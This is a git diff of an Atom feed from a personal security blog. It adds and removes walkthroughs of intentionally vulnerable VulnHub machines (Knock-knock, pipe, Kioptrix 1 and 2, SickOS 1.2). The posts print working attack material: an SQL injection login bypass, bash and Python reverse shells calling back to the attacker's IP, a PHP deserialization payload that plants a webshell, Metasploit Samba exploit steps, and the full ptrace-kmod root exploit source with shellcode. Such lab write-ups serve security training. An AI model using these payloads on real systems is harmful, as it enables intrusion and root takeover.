@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-09T13:26:19-05:00</updated>
+  <updated>2017-01-25T13:58:13-06:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -14,832 +14,927 @@
 
   
   <entry>
-    <title type="html"><![CDATA[vulhub-Kioptrix Level 2]]></title>
-    <link href="http://wg135.github.io/blog/2016/06/07/vulhub-kioptrix2/"/>
-    <updated>2016-06-07T15:56:48-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/06/07/vulhub-kioptrix2</id>
+    <title type="html"><![CDATA[Knock-knock]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/24/knock-knock/"/>
+    <updated>2016-08-24T15:37:28-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/24/knock-knock</id>
+    <content type="html"><![CDATA[<h2>Tools:</h2>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Strings</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/knock/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.166 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.166 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>only port 1337 is opening. Based on the nmap&rsquo;s output. I think this is port knocking.</p>
+
+<p>use netcat to check:</p>
+
+<p><code>nc -nv 192.168.41.166 1337</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the list, looks like port number. I try to knock them, but failed. Then I realized that i should try all permutations, then I wrote script <a href="https://github.com/wg135/script/blob/master/port_knock_all.py">port_knock_all.py</a>. Run that, then rerun nmap</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use nikto</p>
+
+<p><code>nikto -h 192.168.41.166</code></p>
+
+<p>use wfuzz</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.166/FUZZ 2&gt;/dev/null</code></p>
+
+<p>Nothing cool shows.</p>
+
+<p>check the page</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>nothing useful. Since it is only one image, I will download it and check the string in it</p>
+
+<p><code>strings knockknock.jpg</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like we got <code>abfnW/sax2Cw9Ow</code></p>
+
+<p>try to use this login ssh, failed&hellip;.</p>
+
+<p>Figure out it is <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a> and use <a href="http://www.xarg.org/tools/caesar-cipher/">Caesar cipher decryption tool</a></p>
+
+<p>get <code>jason/jB9jP2knf</code></p>
+
+<p>got shell:</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+<code>find / -perm -g=s -o -perm -6000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</code></p>
+
+<p>got a file <code>/home/jason/tfc</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>run the file</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like it need a input file and output file.</p>
+
+<p>tfc will encrypt input and also decrpt input if its encryped. Now generate a large input file.</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>python -c "print 'A'*5000" &gt;in.tfc</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get segmentation fault error.</p>
+
+<p>First, I use <a href="https://github.com/wg135/checksec">checksec.sh</a> to check if there is any protection</p>
+
+<p><code>./checksec.sh  --file tfc</code>
+<img src="/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>No protection.</p>
+
+<p>Since gdb is not available on the target, I download tfc to my kali</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>the address is 0x0675c916  not 0x41414141. so it should be encryption of 0x41414141. I was able to figure out how many bytes to pass in to overwrite the return address (4124 bytes).</p>
+
+<p>(To be continue&hellip;)</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[pipe]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/23/pipe/"/>
+    <updated>2016-08-23T01:31:51-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/23/pipe</id>
     <content type="html"><![CDATA[<h3>Tools:</h3>
 
 <ul>
 <li>netdiscover</li>
 <li>Nmap</li>
-<li>zap</li>
-<li>netcat</li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.183 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.183 -p-</code></p>
-
-<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>
-
-<pre><code>Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-07 16:07 CDT
-NSE: Loaded 138 scripts for scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 16:07
-Completed NSE at 16:07, 0.00s elapsed
-Initiating NSE at 16:07
-Completed NSE at 16:07, 0.00s elapsed
-Initiating ARP Ping Scan at 16:07
-Scanning 192.168.79.183 [1 port]
-Completed ARP Ping Scan at 16:07, 0.00s elapsed (1 total hosts)
-Initiating Parallel DNS resolution of 1 host. at 16:07
-Completed Parallel DNS resolution of 1 host. at 16:08, 13.00s elapsed
-Initiating SYN Stealth Scan at 16:08
-Scanning 192.168.79.183 [65535 ports]
-Discovered open port 443/tcp on 192.168.79.183
-Discovered open port 3306/tcp on 192.168.79.183
-Discovered open port 111/tcp on 192.168.79.183
-Discovered open port 22/tcp on 192.168.79.183
-Discovered open port 80/tcp on 192.168.79.183
-Discovered open port 666/tcp on 192.168.79.183
-Discovered open port 631/tcp on 192.168.79.183
-Completed SYN Stealth Scan at 16:08, 3.99s elapsed (65535 total ports)
-Initiating Service scan at 16:08
-Scanning 7 services on 192.168.79.183
-Completed Service scan at 16:08, 16.01s elapsed (7 services on 1 host)
-Initiating OS detection (try #1) against 192.168.79.183
-NSE: Script scanning 192.168.79.183.
-Initiating NSE at 16:08
-Completed NSE at 16:08, 2.14s elapsed
-Initiating NSE at 16:08
-Completed NSE at 16:08, 0.00s elapsed
-Nmap scan report for 192.168.79.183
-Host is up (0.00052s latency).
-Not shown: 65528 closed ports
-PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
-| ssh-hostkey: 
-|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
-|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
-|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
-|_sshv1: Server supports SSHv1
-80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.0.52 (CentOS)
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-111/tcp  open  rpcbind  2 (RPC #100000)
-| rpcinfo: 
-|   program version   port/proto  service
-|   100000  2            111/tcp  rpcbind
-|   100000  2            111/udp  rpcbind
-|   100024  1            663/udp  status
-|_  100024  1            666/tcp  status
-443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.0.52 (CentOS)
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
-| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
-| Public Key type: rsa
-| Public Key bits: 1024
-| Signature Algorithm: md5WithRSAEncryption
-| Not valid before: 2009-10-08T00:10:47
-| Not valid after:  2010-10-08T00:10:47
-| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
-|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
-|_ssl-date: 2016-06-07T17:59:07+00:00; -3h09m26s from scanner time.
-| sslv2: 
-|   SSLv2 supported
-|   ciphers: 
-|     SSL2_DES_192_EDE3_CBC_WITH_MD5
-|     SSL2_RC2_128_CBC_WITH_MD5
-|     SSL2_RC4_128_WITH_MD5
-|     SSL2_RC4_64_WITH_MD5
-|     SSL2_DES_64_CBC_WITH_MD5
-|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
-|_    SSL2_RC4_128_EXPORT40_WITH_MD5
-631/tcp  open  ipp      CUPS 1.1
-| http-methods: 
-|   Supported Methods: GET HEAD OPTIONS POST PUT
-|_  Potentially risky methods: PUT
-|_http-server-header: CUPS/1.1
-|_http-title: 403 Forbidden
-666/tcp  open  status   1 (RPC #100024)
-3306/tcp open  mysql    MySQL (unauthorized)
-MAC Address: 00:0C:29:55:D2:EE (VMware)
-Device type: general purpose
-Running: Linux 2.6.X
-OS CPE: cpe:/o:linux:linux_kernel:2.6
-OS details: Linux 2.6.9 - 2.6.30
-Uptime guess: 0.018 days (since Tue Jun  7 15:42:38 2016)
-Network Distance: 1 hop
-TCP Sequence Prediction: Difficulty=201 (Good luck!)
-IP ID Sequence Generation: All zeros
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.52 ms 192.168.79.183
-
-NSE: Script Post-scanning.
-Initiating NSE at 16:08
-Completed NSE at 16:08, 0.00s elapsed
-Initiating NSE at 16:08
-Completed NSE at 16:08, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 37.28 seconds
-           Raw packets sent: 65555 (2.885MB) | Rcvd: 65551 (2.623MB)
-</code></pre>
-
-<p>Use Nikto to scan  the web service.</p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>not so excited.</p>
-
-<p>check the webpage:</p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>may contain SQL injection. Use zap to scan:</p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Finally try username as <code>test</code>, password <code>test' or '1'=1'</code> can bypass the login.</p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Now I am looking for command injection:</p>
-
-<p>try:</p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>get:</p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Okay. Now set up netcat on port 4444 and in the web console:</p>
-
-<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>
-
-<p>get the shell:</p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>But not the root. Keep going&hellip;</p>
-
-<p>After enumeration, I found the kernel version is 2.6.9. Now search the exploit</p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Find an interestig one. I tried other exploits too, but failed..</p>
-
-<p>Upload it to the target, compile and run it. ROOT:</p>
-
-<p><img src="/images/blog/vulhub/kioptrix2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Vulhub-Kioptrix level 1]]></title>
-    <link href="http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1/"/>
-    <updated>2016-06-06T09:21:18-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1</id>
-    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>
-
-<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>nbtscab</li>
-<li>enum4linux</li>
-<li>Metasploit</li>
+<li>Wfuzz</li>
 <li>Nikto</li>
+<li>Burp</li>
 </ul>
 
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Tar arbitrary command execution</a></p>
 
 <!--more-->
 
 
 <p>Use netdiscover to detect target IP address</p>
 
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/pipe/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
 
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.182 is the target.</p>
+<p>192.168.41.163 is the target.</p>
 
 <p>Then run nmap to detect opening ports and running services on the target machine.</p>
 
-<p><code>nmap -sV -v -O -A -T5 192.168.79.182 -p-</code></p>
+<p><code>nmap -sV -v -O -A -T5 192.168.41.163 -p-</code></p>
 
-<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>
+<p><img src="/images/blog/vulhub/pipe/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
 
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+<p>there are 4 ports are opening</p>
 
-<p>SMB Attack:</p>
+<p>use nikto to scan</p>
 
-<p>Looks like SMB service is on. Lets start nbtscan to exam SMB.</p>
+<p><code>nikto -h 192.168.41.162</code></p>
 
-<p><code>nbtscan 192.168.79.182</code></p>
+<p><img src="/images/blog/vulhub/pipe/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
 
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+<p>shows there is an <code>index.php</code> but needs autherication</p>
 
-<p>use enum4linux to enumerate smb:</p>
+<p><img src="/images/blog/vulhub/pipe/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
 
-<p><code>enum4linux  -a 192.168.79.182</code></p>
+<p>use wfuzz to scan</p>
 
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  --hc 401 http://192.168.41.163/FUZZ 2&gt;/dev/null</code></p>
 
-<p>get the samba version</p>
+<p>get a path <code>scriptz</code></p>
 
-<p>Now start Metasploit:</p>
+<p><img src="/images/blog/vulhub/pipe/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
 
-<pre><code>msfconsole
-search samba
-use exploit/linux/samba/trans2open
-set rhost 192.168.79.182
-set payload generic/shell_reverse_tcp
-exploit
-</code></pre>
+<p>find a file <code>log.php.BAK</code>, looks like backup file of log.php</p>
 
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE SMB</p>
-
-<p>mod_ssl exploit:</p>
-
-<p>use nikto to scan:</p>
-
-<p><code>nikto -h 192.168.79.182</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like mod_ssl is vulnerable</p>
-
-<p>search exploits:</p>
-
-<p><code>searchexploit openssl</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now try to compile the c code. Get error. Find a <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">blog</a> to fix it.</p>
-
-<p>now recompile:</p>
-
-<p><code>
-gcc 764.c -o 764 -lcrypto
-</code></p>
-
-<p>run the 764 and it requires to input id for the target&rsquo;s supported box eg: 0x00. In the result of nikto, the box is Apache/1.3.20 (Unix)  (Red-Hat/Linux)</p>
-
-<p>so I can just:</p>
-
-<p><code>./764 -h |grep 1.3.20</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>so we can just 0x6a and 0x0b. Finially got 0x0b works</p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>I get the shell, but still not get the root. After analysis, I figure it out that code 764.c download ptrace-kmod.c. compile and execute it. I didn&rsquo;t connect my vm to Internet, so it failed when it tried to download the code. Finally I get the ptrace-kmod.c</p>
-
-<pre><code class="c ptrace-kmod.c">/*
- * Linux kernel ptrace/kmod local root exploit
- *
- * This code exploits a race condition in kernel/kmod.c, which creates
- * kernel thread in insecure manner. This bug allows to ptrace cloned
- * process, allowing to take control over privileged modprobe binary.
- *
- * Should work under all current 2.2.x and 2.4.x kernels.
- * 
- * I discovered this stupid bug independently on January 25, 2003, that
- * is (almost) two month before it was fixed and published by Red Hat
- * and others.
- * 
- * Wojciech Purczynski &lt;cliph@isec.pl&gt;
- *
- * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
- * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
- * 
- * (c) 2003 Copyright by iSEC Security Research
- */
-
-#include &lt;grp.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;paths.h&gt;
-#include &lt;string.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;signal.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/wait.h&gt;
-#include &lt;sys/stat.h&gt;
-#include &lt;sys/param.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;sys/ptrace.h&gt;
-#include &lt;sys/socket.h&gt;
-#include &lt;linux/user.h&gt;
-
-char cliphcode[] =
-    "\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
-    "\x00\x5b\x31\xc9\x89\xca\xcd\x80"
-    "\xb8\x0f\x00\x00\x00\xb9\xed\x0d"
-    "\x00\x00\xcd\x80\x89\xd0\x89\xd3"
-    "\x40\xcd\x80\xe8\xdc\xff\xff\xff";
-
-#define CODE_SIZE (sizeof(cliphcode) - 1)
-
-pid_t parent = 1;
-pid_t child = 1;
-pid_t victim = 1;
-volatile int gotchild = 0;
-
-void fatal(char * msg)
+<pre><code class="php">&lt;?php
+class Log
 {
-    perror(msg);
-    kill(parent, SIGKILL);
-    kill(child, SIGKILL);
-    kill(victim, SIGKILL);
-}
+    public $filename = '';
+    public $data = '';
 
-void putcode(unsigned long * dst)
-{
-    char buf[MAXPATHLEN + CODE_SIZE];
-    unsigned long * src;
-    int i, len;
+    public function __construct()
+    {
+        $this-&gt;filename = '';
+        $this-&gt;data = '';
+    }
 
-    memcpy(buf, cliphcode, CODE_SIZE);
-    len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);
-    if (len == -1)
-        fatal("[-] Unable to read /proc/self/exe");
+    public function PrintLog()
+    {
+        $pre = "[LOG]";
+        $now = date('Y-m-d H:i:s');
 
-    len += CODE_SIZE + 1;
-    buf[len] = '\0';
+        $str = '$pre - $now - $this-&gt;data';
+        eval("\$str = \"$str\";");
+        echo $str;
+    }
 
-    src = (unsigned long*) buf;
-    for (i = 0; i &lt; len; i += 4)
-        if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)
-            fatal("[-] Unable to write shellcode");
-}
-
-void sigchld(int signo)
-{
-    struct user_regs_struct regs;
-
-    if (gotchild++ == 0)
-        return;
-
-    fprintf(stderr, "[+] Signal caught\n");
-
-    if (ptrace(PTRACE_GETREGS, victim, NULL, &amp;regs) == -1)
-        fatal("[-] Unable to read registers");
-
-    fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);
-
-    putcode((unsigned long *)regs.eip);
-
-    fprintf(stderr, "[+] Now wait for suid shell...\n");
-
-    if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
-        fatal("[-] Unable to detach from victim");
-
-    exit(0);
-}
-
-void sigalrm(int signo)
-{
-    errno = ECANCELED;
-    fatal("[-] Fatal error");
-}
-
-void do_child(void)
-{
-    int err;
-
-    child = getpid();
-    victim = child + 1;
-
-    signal(SIGCHLD, sigchld);
-
-    do
-        err = ptrace(PTRACE_ATTACH, victim, 0, 0);
-    while (err == -1 &amp;&amp; errno == ESRCH);
-
-    if (err == -1)
-        fatal("[-] Unable to attach");
-
-    fprintf(stderr, "[+] Attached to %d\n", victim);
-    while (!gotchild) ;
-    if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)
-        fatal("[-] Unable to setup syscall trace");
-    fprintf(stderr, "[+] Waiting for signal\n");
-
-    for(;;);
-}
-
-void do_parent(char * progname)
-{
-    struct stat st;
-    int err;
-    errno = 0;
-    socket(AF_SECURITY, SOCK_STREAM, 1);
-    do {
-        err = stat(progname, &amp;st);
-    } while (err == 0 &amp;&amp; (st.st_mode &amp; S_ISUID) != S_ISUID);
-
-    if (err == -1)
-        fatal("[-] Unable to stat myself");
-
-    alarm(0);
-    system(progname);
-}
-
-void prepare(void)
-{
-    if (geteuid() == 0) {
-        initgroups("root", 0);
-        setgid(0);
-        setuid(0);
-        execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
-        fatal("[-] Unable to spawn shell");
+    public function __destruct()
+    {
+        file_put_contents($this-&gt;filename, $this-&gt;data, FILE_APPEND);
     }
 }
-
-int main(int argc, char ** argv)
-{
-    prepare();
-    signal(SIGALRM, sigalrm);
-    alarm(10);
-
-    parent = getpid();
-    child = fork();
-    victim = child + 1;
-
-    if (child == -1)
-        fatal("[-] Unable to fork");
-
-    if (child == 0)
-        do_child();
-    else
-        do_parent(argv[0]);
-
-    return 0;
-}
+?&gt;
 </code></pre>
 
-<p>in target vm /tmp:</p>
+<p>in order to check if the authentication can be bypassed, I use <code>http method tamper</code>.</p>
 
-<p><code>wget http://192.168.79.173/ptrace-kmod.c</code></p>
+<p><code>nmap -p 80 --script http-method-tamper --script-args 'http-method-tamper.paths={/index.php}' 192.168.41.163</code></p>
 
-<p>&lsquo;gcc ptrace-kmod.c -o attack&rsquo;</p>
+<p><img src="/images/blog/vulhub/pipe/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>run attack:</p>
+<p>It&rsquo;s vulnerable to POST method.</p>
 
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+<p>Use Burp to change GET request to /index.php to POST request, and get the page:</p>
 
-<p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[sickos1.2]]></title>
-    <link href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/"/>
-    <updated>2016-05-31T13:08:16-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2</id>
-    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>
+<p><img src="/images/blog/vulhub/pipe/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
 
-<h3>Tools:</h3>
+<p>check the source code:</p>
 
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>Nikto</li>
-<li>Wfuzz</li>
-<li>Curl</li>
-</ul>
+<p><img src="/images/blog/vulhub/pipe/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
 
+<p>The page will load <code>scriptz/php.js</code>, and it serialises some data. Based on the log.php.BAK code,</p>
 
-<!--more-->
+<p>click link <code>Show Artist Info</code>, get the url, after decoding:</p>
 
+<p><code>O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}</code></p>
 
-<p>Use netdiscover to detect target IP address</p>
+<p>The “Info” function looks like a way to read information from a specific file. Recheck the log.php.BAK file, find it use <code>file_put_contents($this-&gt;filename, $this-&gt;data, FILE_APPEND)</code> to write data to a file.</p>
 
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+<p>Test if it can write to a Log file</p>
 
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+<p><code>param=O:3:"Log":2:{s:8:"filename";s:8:"Test.txt";s:4:"data";s:4:"TEST";}</code></p>
 
-<p>192.168.79.180 is the target.</p>
+<p>doesn&rsquo;t work</p>
 
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+<p><code>param=O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/scriptz/Test.txt";s:4:"data";s:4:"TEST";}</code></p>
 
-<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>
+<p>works</p>
 
-<p>Looks like port 22 and port 80 are openning.</p>
+<p>based on that, build payload:</p>
 
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+<p><code>param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" &lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;";}</code></p>
 
-<p>Check the <a href="http://192.168.79.180">http://192.168.79.180</a></p>
+<p>replace the parameter in Burp. forward the traffic</p>
 
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+<p><img src="/images/blog/vulhub/pipe/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>Not excited.</p>
+<p>then:</p>
 
-<p>use Nikto:</p>
+<p><img src="/images/blog/vulhub/pipe/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
 
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+<p>webshell is there.</p>
 
-<p>Still nothing cool</p>
+<p>setup backdoor:</p>
 
-<p>try wfuzz:</p>
-
-<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.180/FUZZ 2&gt;/dev/null
-</code></pre>
-
-<p>find a test dir:</p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>next exam the HTTP options:</p>
-
-<pre><code>curl -v -X OPTIONS http://192.168.79.180/test/
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>looks like it supports PUT.</p>
-
-<p>Now upload php reverse shell (I tried different ports, looks like only 443 port works):</p>
-
-<pre><code>nmap -p80 192.168.79.180 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php'
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now the shell is uploaded:</p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>get the reverse shell:</p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>A better php shell:</p>
-
-<pre><code class="php">&lt;?php system($_GET["exec"]); ?&gt;
-</code></pre>
-
-<p>Upload this shell, and in brower:</p>
-
-<pre><code>http://192.168.79.180/test/exec.php?exec=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.79.173",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</code></pre>
-
-<p>get the shell.</p>
-
-<p>During enumeration step, I follow <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a></p>
-
-<p><code>ls -l /etc/cron.daily</code></p>
-
